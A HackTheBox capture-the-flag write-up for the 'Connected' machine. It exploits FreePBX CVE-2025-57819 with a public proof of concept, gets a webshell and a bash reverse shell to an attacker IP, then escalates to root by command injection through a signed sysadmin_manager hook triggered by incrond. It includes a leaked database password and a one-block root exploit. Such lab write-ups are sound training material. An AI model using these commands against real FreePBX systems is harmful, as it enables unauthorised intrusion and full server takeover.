---
title: "HTB - Connected"
date: 2026-06-06
tags: ["HackTheBox", "Linux", "Medium", "CVE-2025-57819"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Connected.png"
---
**Difficulty:** Medium | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.

### The Logo
The machine logo shows a visual representation of network and telecom connections. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.

**What the logo tells us immediately:**
- **Network / Telephony lines:** A system managing communication channels, VoIP gateways, or PBX nodes.
- **Telecom theme:** Likely FreePBX, Asterisk, or a similar telephony administration interface.

### The Name
"Connected" combined with the logo points toward:
- Telephony networks, voice connections, or dial-in systems. FreePBX/Asterisk is the industry-standard Linux VoIP gateway.
- A service coordinating connections, ports, or SIP trunks.

### The Instant Hypothesis
Combining name and logo before even running nmap:
> *"This is a Linux VoIP server running FreePBX/Asterisk. The name 'Connected' is a direct nod to telephony connections, and the logo reinforces this. The foothold is likely an exploit in FreePBX (potentially a recent CVE like CVE-2025-57819), and privilege escalation will likely involve abusing telephony or PBX configuration files/processes."*

This hypothesis is confirmed within minutes of scanning and basic web interaction.

<!--more-->

---

## Overview

Connected runs FreePBX, a VoIP management platform built on Asterisk. The attack chain abuses a recently disclosed unauthenticated RCE vulnerability (CVE-2025-57819) to gain a foothold, then escalates to root via a signed hook injection vulnerability in FreePBX's `sysadmin_manager` service, triggered through `incrond`.

---

## Reconnaissance

Standard port scan reveals HTTP on port 80 running FreePBX. Adding `connected.htb` to `/etc/hosts` and browsing to the admin panel confirms a vulnerable FreePBX instance.

---

## Initial Access - CVE-2025-57819 (FreePBX Auth Bypass + SQLi + RCE)

CVE-2025-57819 is an unauthenticated vulnerability chain in FreePBX that allows:
1. Auth bypass via a malformed AJAX request to the endpoint module
2. SQL injection into the `cron_jobs` table via the `brand=` parameter
3. Execution of an arbitrary command via FreePBX's DAG cron runner after a ~2 minute delay

The watchTowr PoC automates the full chain. Download it from:
https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/blob/main/watchTowr-vs-FreePBX-CVE-2025-57819.py

Save it as `cve-2025-57819.py` and run:

```bash
python3 cve-2025-57819.py -H http://connected.htb
```

The script:
1. Sends the SQLi payload to inject a cron entry that base64-decodes a PHP webshell into `/var/www/html/`
2. Waits 2 minutes for FreePBX's DAG runner to execute the cron job
3. Confirms the webshell landed and prints its URL

Expected output:

```
[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-<random>.php?cmd=hostname
[+] Cleaning malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```

Note: the webshell filename is randomized each run. Use the URL printed by the script, not a hardcoded one.

**Verify RCE:**

```bash
curl "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-<random>.php?cmd=id"
```

**Trigger a reverse shell:**

```bash
# Start listener on Kali
rlwrap nc -lvnp 4444

# Trigger shell through webshell
curl "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-<random>.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261'"
```

Shell lands as `asterisk`.

---

## User Flag

```bash
cat /home/asterisk/user.txt
```

---

## Privilege Escalation - sysadmin_manager Hook Injection via incrond

### Enumeration

**FreePBX config leaks DB credentials:**

```bash
cat /etc/freepbx.conf
```

```
AMPDBUSER=freepbxuser
AMPDBPASS=mZzDpAGKTmPJ
AMPDBNAME=asterisk
```

Password reuse against root fails (`su root` with `mZzDpAGKTmPJ` is denied).

**Check what incrond is watching:**

```bash
cat /etc/incron.d/*
```

Key rules:

```
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

The `asterisk` user has write access to `/var/spool/asterisk/incron/`. When a file is written there, `incrond` (running as root) calls `/usr/bin/sysadmin_manager` with the filename as the argument.

### Understanding sysadmin_manager

`/usr/bin/sysadmin_manager` is a readable PHP script (deliberately left unencoded per its own comments). Inspecting it reveals the hook format and validation logic:

```bash
cat /usr/bin/sysadmin_manager
```

The script:
1. Takes `$argv[1]` as the filename (e.g. `api.fwconsole-commands.CONTENTS`)
2. Splits on `.` to get `module` = `api`, `hookname` = `fwconsole-commands`, `params` = `CONTENTS`
3. Locates the hook at `/var/www/html/admin/modules/api/hooks/fwconsole-commands`
4. Validates the hook file is GPG-signed by a trusted FreePBX key (whitelist of 8 key IDs)
5. If valid, executes: `php /var/www/html/admin/modules/api/hooks/fwconsole-commands <params>`

The trusted hook `/var/www/html/admin/modules/api/hooks/fwconsole-commands` contains:

```php
$settings = @json_decode(gzuncompress(@base64_decode($b)), true);
$command = $settings[0];
$cmd = "/usr/sbin/fwconsole $command 2>&1";
$result = exec($cmd, $output, $return);
```

The hook decodes the base64+gzip params from the filename, takes `$settings[0]` as a fwconsole subcommand, and passes it directly to `exec()`. There is no sanitization. A semicolon in `$settings[0]` allows arbitrary command injection.

The GPG signature check protects the hook file on disk, but the payload is encoded inside the filename and decoded only at runtime inside the hook. The injection happens entirely after signature validation passes.

### Step-by-Step Exploitation

**Step 1 - Generate the payload**

The payload is a JSON array `["<command>","tx"]` compressed with gzip and base64-encoded. The special filename suffix `CONTENTS` tells `sysadmin_manager` to read params from the file contents rather than the filename directly.

On the target (python3 is not available, use php):

```bash
PAYLOAD=$(php -r '$p=json_encode(["--help;chmod u+s /bin/bash","tx"]); echo base64_encode(gzcompress($p));')
```

This produces a base64+gzip blob encoding the JSON `["--help;chmod u+s /bin/bash","tx"]`. When decoded inside the hook, `$settings[0]` becomes `--help;chmod u+s /bin/bash`, which causes fwconsole to run `--help` (valid) and then execute `chmod u+s /bin/bash` as root via the semicolon injection.

**Step 2 - Write to the watched directory to trigger incrond**

The filename format must be `module.hookname.PAYLOAD` or `module.hookname.CONTENTS` (where CONTENTS causes the payload to be read from file body). Use `printf` rather than `echo` or `touch` to ensure the `IN_CLOSE_WRITE` inotify event fires correctly:

```bash
printf '%s' "$PAYLOAD" > /var/spool/asterisk/incron/api.fwconsole-commands.CONTENTS
```

`incrond` detects `IN_CLOSE_WRITE` on the directory and immediately calls as root:

```
/usr/bin/sysadmin_manager api.fwconsole-commands.CONTENTS
```

`sysadmin_manager` reads the file contents as the payload, validates the `fwconsole-commands` hook signature (passes - the hook is legitimately signed by FreePBX), then executes:

```bash
php /var/www/html/admin/modules/api/hooks/fwconsole-commands <PAYLOAD>
```

The hook decodes the payload and runs as root:

```bash
/usr/sbin/fwconsole --help;chmod u+s /bin/bash
```

**Step 3 - Confirm SUID and get root shell**

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

/bin/bash -p
id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) egid=0(root)
```

**Step 4 - Root flag**

```bash
cat /root/root.txt
```

### Full Exploit (one block)

```bash
PAYLOAD=$(php -r '$p=json_encode(["--help;chmod u+s /bin/bash","tx"]); echo base64_encode(gzcompress($p));')
printf '%s' "$PAYLOAD" > /var/spool/asterisk/incron/api.fwconsole-commands.CONTENTS
/bin/bash -p
```

---

## Summary

| Stage | Technique |
|---|---|
| Initial Access | CVE-2025-57819 - FreePBX unauth SQLi -> cron -> webshell |
| Foothold | Bash reverse shell via PHP webshell |
| User Flag | `/home/asterisk/user.txt` |
| Privesc | incrond + sysadmin_manager signed hook injection -> SUID bash |
| Root Flag | `/root/root.txt` |

---

## Key Takeaways

- FreePBX's DAG cron runner executes injected SQL cron entries with no authentication required (CVE-2025-57819)
- `sysadmin_manager` validates GPG signatures on hook files but the injectable payload is encoded inside the filename, decoded only at runtime inside the signed hook - the injection point is after all validation
- `incrond` watches asterisk-writable directories and runs commands as root, making it a powerful privesc primitive when the hook validation can be abused
- The `IN_CLOSE_WRITE` inotify event is required to trigger incrond - `printf` into a file triggers it reliably, while `touch` alone does not write file contents and may not trigger correctly
- The CONTENTS suffix in the filename tells `sysadmin_manager` to read the payload from the file body rather than the filename itself, avoiding filename length and character restrictions
